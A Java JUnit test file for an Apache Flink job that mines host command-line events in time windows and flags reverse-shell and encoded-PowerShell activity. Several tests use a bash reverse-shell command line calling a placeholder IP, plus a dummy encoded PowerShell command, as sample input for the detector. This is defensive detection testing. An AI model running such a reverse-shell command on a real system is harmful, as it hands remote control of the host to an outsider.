package com.sls.hunter.flink;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.time.Instant;
import java.time.LocalDate;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import org.apache.flink.api.common.typeinfo.Types;
import org.apache.flink.api.java.functions.KeySelector;
import org.apache.flink.runtime.checkpoint.OperatorSubtaskState;
import org.apache.flink.streaming.api.operators.KeyedProcessOperator;
import org.apache.flink.streaming.api.watermark.Watermark;
import org.apache.flink.streaming.runtime.streamrecord.StreamRecord;
import org.apache.flink.streaming.util.KeyedOneInputStreamOperatorTestHarness;
import org.junit.jupiter.api.Test;

class WindowMiningTest {
  private static final String SHELL = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1";

  private static MiningConfig config(long windowMillis, long latenessMillis, double minScore) {
    Properties properties = new Properties();
    properties.setProperty("target.start.date", "2026-06-10");
    properties.setProperty("history.compare", "false");
    properties.setProperty("fleet.mode", "exact");
    properties.setProperty("rule.version", "java-v1-legacy-fleet");
    properties.setProperty("window.size.ms", Long.toString(windowMillis));
    properties.setProperty("allowed.lateness.ms", Long.toString(latenessMillis));
    properties.setProperty("window.min.score", Double.toString(minScore));
    return new MiningConfig(properties);
  }

  private static KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness(
      MiningConfig miningConfig) throws Exception {
    return new KeyedOneInputStreamOperatorTestHarness<String, Event, String>(
        new KeyedProcessOperator<String, Event, String>(new WindowMiningFunction(miningConfig)),
        new KeySelector<Event, String>() {
          @Override
          public String getKey(Event event) {
            return event.family;
          }
        },
        Types.STRING);
  }

  private static Event at(String id, long epoch, String host, String proc, String command) {
    return Event.parse(
        Json.write(
            Json.obj(
                "event_id",
                id,
                "index_family",
                "tracing_sas_linux",
                "payload",
                Json.obj(
                    "@timestamp",
                    Instant.ofEpochMilli(epoch).toString(),
                    "host_ip",
                    host,
                    "username",
                    "root",
                    "proc_name",
                    proc,
                    "cmdline",
                    command))));
  }

  private static void send(KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness, Event event)
      throws Exception {
    harness.processElement(new StreamRecord<Event>(event, event.time));
  }

  @SuppressWarnings("unchecked")
  private static List<Map<String, Object>> signals(Map<String, Object> snapshot) {
    return (List<Map<String, Object>>) snapshot.get("all_signals");
  }

  @Test
  void alignsToEpochAndKeepsTheCurrentScore() throws Exception {
    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    assertEquals(start, WindowMining.windowStart(start + 1000, 60_000));
    assertEquals(start + 60_000, WindowMining.windowStart(start + 60_000, 60_000));
    MiningConfig miningConfig = config(60_000, 0, 0);
    DayBucket bucket = new DayBucket();
    assertTrue(bucket.add(at("shell", start, "10.0.0.2", "bash", SHELL)));
    assertTrue(bucket.add(at("plain", start + 1000, "10.0.0.2", "echo", "echo hi")));
    MiningEngine.Result scored =
        WindowMining.evaluate(
            "tracing_sas_linux", bucket, LocalDate.parse("2026-06-10"), miningConfig);
    assertEquals(1, WindowMining.highScores(scored.signals(), 0).size());
    assertTrue(WindowMining.highScores(scored.signals(), 100).isEmpty());
    assertEquals(
        scored.signals().get(0).get("score"),
        WindowMining.highScores(scored.signals(), 0).get(0).get("score"));
  }

  @Test
  @SuppressWarnings("unchecked")
  void closedWindowEmitsOnlyThatWindow() throws Exception {
    MiningConfig miningConfig = config(60_000, 0, 0);
    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness =
        harness(miningConfig)) {
      harness.open();
      harness.setProcessingTime(start);
      send(harness, at("shell-a", start, "10.0.0.2", "bash", SHELL));
      send(harness, at("plain", start + 1000, "10.0.0.2", "echo", "echo hi"));
      send(harness, at("shell-b", start + 60_000, "10.0.0.3", "bash", SHELL));
      harness.processWatermark(new Watermark(start + 60_000));
      assertEquals(1, harness.extractOutputValues().size());
      Map<String, Object> first = Json.map(harness.extractOutputValues().get(0));
      assertEquals("FINAL", first.get("status"));
      assertEquals(1L, ((Number) first.get("revision")).longValue());
      assertEquals("2026-06-10T02:00:00Z", first.get("window_start"));
      assertEquals("2026-06-10T02:01:00Z", first.get("window_end"));
      assertEquals("2026-06-10", first.get("target_day"));
      assertEquals("tracing_sas_linux", first.get("index_family"));
      List<Map<String, Object>> rows = signals(first);
      assertEquals(1, rows.size());
      assertEquals("10.0.0.2", rows.get(0).get("host_ip"));
      assertEquals("reverse_shell", rows.get(0).get("behavior_label"));
      assertEquals("2026-06-10T02:00:00Z", rows.get(0).get("window_start"));
      DayBucket sameWindow = new DayBucket();
      assertTrue(sameWindow.add(at("shell-a", start, "10.0.0.2", "bash", SHELL)));
      assertTrue(sameWindow.add(at("plain", start + 1000, "10.0.0.2", "echo", "echo hi")));
      MiningEngine.Result direct =
          WindowMining.evaluate(
              "tracing_sas_linux", sameWindow, LocalDate.parse("2026-06-10"), miningConfig);
      assertEquals(direct.signals().get(0).get("score"), rows.get(0).get("score"));
      harness.processWatermark(new Watermark(start + 120_000));
      assertEquals(2, harness.extractOutputValues().size());
      Map<String, Object> second = Json.map(harness.extractOutputValues().get(1));
      assertEquals("2026-06-10T02:01:00Z", second.get("window_start"));
      assertEquals("10.0.0.3", signals(second).get(0).get("host_ip"));
    }
  }

  @Test
  void scoreFloorDropsTheWindow() throws Exception {
    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness =
        harness(config(60_000, 0, 100))) {
      harness.open();
      harness.setProcessingTime(start);
      send(harness, at("shell", start, "10.0.0.2", "bash", SHELL));
      harness.processWatermark(new Watermark(start + 60_000));
      assertTrue(harness.extractOutputValues().isEmpty());
    }
  }

  @Test
  void lateEventCorrectsUntilTheWindowIsPurged() throws Exception {
    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness =
        harness(config(60_000, 10_000, 0))) {
      harness.open();
      harness.setProcessingTime(start);
      send(harness, at("shell-a", start, "10.0.0.2", "bash", SHELL));
      harness.processWatermark(new Watermark(start + 60_000));
      Map<String, Object> first = Json.map(harness.extractOutputValues().get(0));
      assertEquals("FINAL", first.get("status"));
      send(harness, at("shell-c", start + 1000, "10.0.0.4", "bash", SHELL));
      assertEquals(2, harness.extractOutputValues().size());
      Map<String, Object> corrected = Json.map(harness.extractOutputValues().get(1));
      assertEquals("CORRECTED", corrected.get("status"));
      assertEquals(2L, ((Number) corrected.get("revision")).longValue());
      assertEquals(2, signals(corrected).size());
      harness.processWatermark(new Watermark(start + 70_000));
      send(harness, at("shell-d", start + 2000, "10.0.0.5", "bash", SHELL));
      assertEquals(1, harness.getSideOutput(WindowMiningFunction.LATE).size());
      assertEquals(2, harness.extractOutputValues().size());
    }
  }

  @Test
  void openWindowSurvivesCheckpoint() throws Exception {
    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    MiningConfig miningConfig = config(60_000, 0, 0);
    OperatorSubtaskState checkpoint;
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness =
        harness(miningConfig)) {
      harness.open();
      harness.setProcessingTime(start);
      send(harness, at("shell", start, "10.0.0.2", "bash", SHELL));
      checkpoint = harness.snapshot(1, start);
      assertTrue(harness.extractOutputValues().isEmpty());
    }
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness =
        harness(miningConfig)) {
      harness.initializeState(checkpoint);
      harness.open();
      harness.setProcessingTime(start + 1000);
      harness.processWatermark(new Watermark(start + 60_000));
      Map<String, Object> snapshot = Json.map(harness.extractOutputValues().get(0));
      assertEquals("FINAL", snapshot.get("status"));
      assertEquals("reverse_shell", signals(snapshot).get(0).get("behavior_label"));
    }
  }

  @Test
  void controlInputDoesNotOpenAWindow() throws Exception {
    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness =
        harness(config(60_000, 0, 0))) {
      harness.open();
      harness.setProcessingTime(start);
      send(
          harness,
          Event.parse(
              Json.write(
                  Json.obj(
                      "kind", "SEAL", "index_family", "tracing_sas_linux", "day", "2026-06-10"))));
      harness.processWatermark(new Watermark(start + 120_000));
      assertTrue(harness.extractOutputValues().isEmpty());
    }
  }

  private static MiningConfig historyConfig() {
    Properties properties = new Properties();
    properties.setProperty("history.compare", "true");
    properties.setProperty("baseline.days", "1");
    properties.setProperty("fleet.mode", "exact");
    properties.setProperty("window.size.ms", "60000");
    properties.setProperty("allowed.lateness.ms", "10000");
    return new MiningConfig(properties);
  }

  private static Event seal(String day) {
    return Event.parse(Json.write(Json.obj("kind", "SEAL", "index_family", "tracing_sas_linux", "day", day)));
  }

  @Test
  void historyRejectsWindowsThatDoNotAlignWithDays() {
    Properties properties = new Properties();
    properties.setProperty("history.compare", "true");
    properties.setProperty("window.size.ms", "70000");
    assertThrows(IllegalArgumentException.class, () -> WindowMiningJob.validateWindowConfig(new MiningConfig(properties)));
  }

  @Test
  void highRiskDoesNotWaitForBaselineAndChecksEventsBeyondSampleLimit() throws Exception {
    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(historyConfig())) {
      h.open();
      for (int i = 0; i < 31; i++) send(h, at("shell-" + i, start + i, "10.0.0.1", "bash", SHELL));
      send(h, at("other-host", start + 50, "10.0.0.99", "bash", SHELL));
      h.processWatermark(new Watermark(start + 60000));
      Map<String, Object> snapshot = Json.map(h.extractOutputValues().get(0));
      assertEquals(false, snapshot.get("baseline_complete"));
      assertTrue(signals(snapshot).stream().anyMatch(row -> "high_risk".equals(row.get("channel"))
          && "10.0.0.99".equals(row.get("host_ip"))));
      assertTrue(signals(snapshot).stream().noneMatch(row -> "history".equals(row.get("channel"))));
    }
  }

  @Test
  void sealedSameTimeBaselineProducesHistoryAndUsesAverage() throws Exception {
    long target = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    long prior = target - 86400000L;
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(historyConfig())) {
      h.open();
      send(h, at("old", prior, "10.0.0.1", "echo", "echo hi"));
      send(h, seal("2026-06-09"));
      for (int i = 0; i < 3; i++) send(h, at("new" + i, target + i, "10.0.0.1", "echo", "echo hi"));
      h.processWatermark(new Watermark(target + 60000));
      Map<String, Object> snapshot = h.extractOutputValues().stream().map(Json::map)
          .filter(row -> "2026-06-10T02:00:00Z".equals(row.get("window_start"))).findFirst().get();
      assertEquals(true, snapshot.get("baseline_complete"));
      Map<String, Object> signal = signals(snapshot).stream().filter(row -> "window_spike_triple".equals(row.get("signal_type"))).findFirst().get();
      assertEquals(3.0, ((Number) signal.get("spike_ratio")).doubleValue());
      assertEquals(1L, ((Number) signal.get("baseline_count")).longValue());
    }
  }

  @Test
  void lateSealActivatesZeroBaselineAndSurvivesCheckpoint() throws Exception {
    long target = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    OperatorSubtaskState checkpoint;
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(historyConfig())) {
      h.open();
      send(h, at("one", target, "10.0.0.1", "echo", "echo hi"));
      send(h, at("two", target + 1, "10.0.0.1", "echo", "echo hi"));
      h.processWatermark(new Watermark(target + 60000));
      assertTrue(h.extractOutputValues().isEmpty());
      checkpoint = h.snapshot(1, target);
    }
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(historyConfig())) {
      h.initializeState(checkpoint); h.open();
      h.processWatermark(new Watermark(target + 60000));
      send(h, seal("2026-06-09"));
      Map<String, Object> snapshot = Json.map(h.extractOutputValues().get(0));
      assertEquals(true, snapshot.get("baseline_complete"));
      assertTrue(signals(snapshot).stream().anyMatch(row -> "window_novel_triple".equals(row.get("signal_type"))));
    }
  }
  @Test
  void sealUpdatesAlreadyPublishedHighRiskSnapshot() throws Exception {
    long target = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(historyConfig())) {
      h.open();
      send(h, at("shell", target, "10.0.0.1", "bash", SHELL));
      h.processWatermark(new Watermark(target + 60000));
      Map<String, Object> first = Json.map(h.extractOutputValues().get(0));
      assertEquals(false, first.get("baseline_complete"));
      send(h, seal("2026-06-09"));
      Map<String, Object> updated = Json.map(h.extractOutputValues().get(1));
      assertEquals(true, updated.get("baseline_complete"));
      assertEquals("CORRECTED", updated.get("status"));
      assertEquals(2L, ((Number) updated.get("revision")).longValue());
      assertTrue(signals(updated).stream().anyMatch(row -> "reverse_shell".equals(row.get("behavior_label"))));
    }
  }

  @Test
  void fixedWindowIncludesLastSubsecondOfDay() throws Exception {
    long eventTime = Instant.parse("2026-06-10T15:59:59.999Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(historyConfig())) {
      h.open(); send(h, at("last", eventTime, "10.0.0.1", "bash", SHELL));
      h.processWatermark(new Watermark(eventTime + 1));
      assertTrue(signals(Json.map(h.extractOutputValues().get(0))).stream()
          .anyMatch(row -> "reverse_shell".equals(row.get("behavior_label"))));
    }
  }

  @Test
  void lateEvidenceCanRetractLastHistoricalSignal() throws Exception {
    long target = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(historyConfig())) {
      h.open();
      for (int i = 0; i < 20; i++) send(h, at("old" + i, target - 86400000L + i, "10.0.0.1", "echo", "echo usual"));
      send(h, seal("2026-06-09"));
      send(h, at("new1", target + 30000, "10.0.0.1", "echo", "echo different"));
      send(h, at("new2", target + 31000, "10.0.0.1", "echo", "echo different"));
      h.processWatermark(new Watermark(target + 60000));
      Map<String, Object> first = Json.map(h.extractOutputValues().get(0));
      assertTrue(signals(first).stream().anyMatch(row -> "window_novel_template".equals(row.get("signal_type"))));
      for (int i = 0; i < 12; i++) send(h, at("late" + i, target + i, "10.0.0.1", "echo", "echo usual"));
      List<String> output = h.extractOutputValues();
      Map<String, Object> last = Json.map(output.get(output.size() - 1));
      assertTrue(signals(last).isEmpty());
      assertEquals("CORRECTED", last.get("status"));
      assertTrue(((List<?>) last.get("deleted_signal_ids")).size() > 0);
    }
  }

  @Test
  void encodedPowershellIsDetectedWithoutHistoryOrMinimumCount() throws Exception {
    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    Event e = Event.parse(Json.write(Json.obj("event_id", "ps", "index_family", "tracing_sas_win", "payload",
        Json.obj("@timestamp", Instant.ofEpochMilli(start).toString(), "host_ip", "10.0.0.1", "username", "u",
            "proc_name", "powershell.exe", "cmdline", "powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA"))));
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(historyConfig())) {
      h.open(); send(h, e); h.processWatermark(new Watermark(start + 60000));
      Map<String, Object> snapshot = Json.map(h.extractOutputValues().get(0));
      assertEquals(false, snapshot.get("baseline_complete"));
      assertTrue(signals(snapshot).stream().anyMatch(row -> "high_risk_structure".equals(row.get("signal_type"))));
    }
  }

  @Test
  void historyUsesMeanAcrossMatchingSlots() {
    MiningConfig config = historyConfig();
    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    DayBucket target = new DayBucket(), first = new DayBucket(), second = new DayBucket();
    for (int i = 0; i < 6; i++) target.add(at("t" + i, start + i, "h", "echo", "echo same"), false);
    first.add(at("a", start - 86400000L, "h", "echo", "echo same"), false);
    for (int i = 0; i < 3; i++) second.add(at("b" + i, start - 2 * 86400000L + i, "h", "echo", "echo same"), false);
    MiningEngine.Result result = WindowMining.evaluateChannels("tracing_sas_linux", target,
        java.util.Arrays.asList(first, second), true, config);
    Map<String, Object> signal = result.signals().stream()
        .filter(row -> "window_spike_triple".equals(row.get("signal_type"))).findFirst().get();
    assertEquals(2.0, ((Number) signal.get("baseline_average")).doubleValue());
    assertEquals(3.0, ((Number) signal.get("spike_ratio")).doubleValue());
  }

}
